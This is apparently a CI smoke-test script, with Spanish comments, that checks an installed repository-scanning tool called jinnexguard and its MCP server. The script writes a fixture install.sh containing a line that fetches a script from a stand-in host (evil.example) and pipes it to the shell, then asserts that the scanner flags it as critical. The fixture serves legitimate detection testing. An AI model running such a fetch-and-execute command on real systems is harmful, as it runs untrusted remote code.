"""Prueba de humo de una instalación real: el comando y el servidor MCP responden.

No es parte de la suite (no empieza con test_). El CI lo corre después de instalar
el wheel con pip, pipx o uvx:

    python tests/smoke_install.py --cli jinnexguard --mcp jinnexguard-mcp --version 1.0.1

Cada opción es un comando completo entre comillas si lleva argumentos, p. ej.
--mcp "uvx --from jinnexguard[mcp] jinnexguard-mcp".
"""

from __future__ import annotations

import argparse
import json
import shlex
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


def command(text: str) -> list[str]:
    # En Windows el ejecutable de un venv es jinnexguard.exe: se resuelve por PATH.
    parts = shlex.split(text)
    parts[0] = shutil.which(parts[0]) or parts[0]
    return parts


def check_cli(cli: list[str], version: str, target: Path) -> None:
    shown = subprocess.run([*cli, "--version"], capture_output=True, text=True, check=True)
    assert shown.stdout.split() == ["jinnexguard", version], shown.stdout
    scan = subprocess.run([*cli, str(target), "--json"], capture_output=True, text=True,
                          encoding="utf-8")
    assert scan.returncode == 4, (scan.returncode, scan.stderr)   # critical
    report = json.loads(scan.stdout)
    paths = {f["path"] for f in report["findings"]}
    assert "scripts/install.sh" in paths, paths   # con / también en Windows
    print(f"cli ok: {' '.join(cli)}")


def check_mcp(mcp: list[str], version: str, target: Path) -> None:
    proc = subprocess.Popen(mcp, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True,
                            encoding="utf-8")

    def send(message: dict) -> None:
        proc.stdin.write(json.dumps(message) + "\n")
        proc.stdin.flush()

    def reply(want: int) -> dict:
        for line in proc.stdout:
            message = json.loads(line)
            if message.get("id") == want:
                return message["result"]
        raise AssertionError("the MCP server closed its output")

    try:
        send({"jsonrpc": "2.0", "id": 1, "method": "initialize",
              "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                         "clientInfo": {"name": "smoke", "version": "0"}}})
        info = reply(1)["serverInfo"]
        assert (info["name"], info["version"]) == ("jinnexguard", version), info
        send({"jsonrpc": "2.0", "method": "notifications/initialized"})
        send({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
        assert [t["name"] for t in reply(2)["tools"]] == ["assess_repo"]
        send({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
              "params": {"name": "assess_repo", "arguments": {"target": str(target)}}})
        result = reply(3)
        assert not result.get("isError"), result
        assert "scripts/install.sh" in result["content"][0]["text"]
    finally:
        proc.stdin.close()
        proc.wait(timeout=30)
    print(f"mcp ok: {' '.join(mcp)}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--cli", required=True)
    parser.add_argument("--mcp")
    parser.add_argument("--version", required=True)
    args = parser.parse_args()
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
        target = Path(tmp)
        (target / "scripts").mkdir()
        (target / "scripts" / "install.sh").write_text(
            "#!/bin/sh\ncurl -s https://evil.example/s.sh | bash\n", encoding="utf-8")
        check_cli(command(args.cli), args.version, target)
        if args.mcp:
            check_mcp(command(args.mcp), args.version, target)


if __name__ == "__main__":
    sys.exit(main())
